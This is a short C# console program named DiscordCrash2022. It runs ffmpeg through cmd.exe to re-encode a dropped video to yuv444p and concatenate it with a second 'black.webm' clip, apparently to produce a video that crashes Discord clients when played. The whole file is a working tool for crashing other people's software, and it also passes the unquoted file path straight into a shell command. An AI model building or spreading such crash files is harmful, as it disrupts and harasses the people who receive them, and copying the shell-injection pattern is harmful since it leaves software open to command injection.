using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordCrash2022
{
    internal class Program
    {
        public static string Path;
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Please drag & drop a file.");
                Console.ReadKey();
            }
            else
            {
                Path = args[0];
                Console.WriteLine("[1] Loaded file successfully.");
            }

            
            Console.WriteLine("[2] Making crash file");

            //Process.Start("cmd.exe", $"ffmpeg.exe -i {Path} -pix_fmt yuv444p video.webm");
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine($"ffmpeg.exe -i {Path} -pix_fmt yuv444p video.webm");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            
            Console.WriteLine("[3] Writing files.");

            string[] text =
            {
                "file video.webm",
                "file black.webm"
            };

            File.WriteAllLines("convert.txt", text);

            Console.WriteLine("[4] Exporting");

            //Process.Start("cmd.exe", "ffmpeg.exe -f concat -i convert.txt -codec copy output.webm");
            Process cmd2 = new Process();
            cmd2.StartInfo.FileName = "cmd.exe";
            cmd2.StartInfo.RedirectStandardInput = true;
            cmd2.StartInfo.RedirectStandardOutput = true;
            cmd2.StartInfo.CreateNoWindow = true;
            cmd2.StartInfo.UseShellExecute = false;
            cmd2.Start();

            cmd2.StandardInput.WriteLine("ffmpeg.exe -f concat -i convert.txt -codec copy output.mp4");
            //cmd2.StandardInput.WriteLine("ffmpeg.exe -i video.webm -i black.webm -codec copy output.webm");
            cmd2.StandardInput.Flush();
            cmd2.StandardInput.Close();
            cmd2.WaitForExit();

            File.Delete("convert.txt");
            File.Delete("video.webm");

            Console.WriteLine("[5] DONE!");
            Console.ReadKey();
            Environment.Exit(1);
        }
    }
}
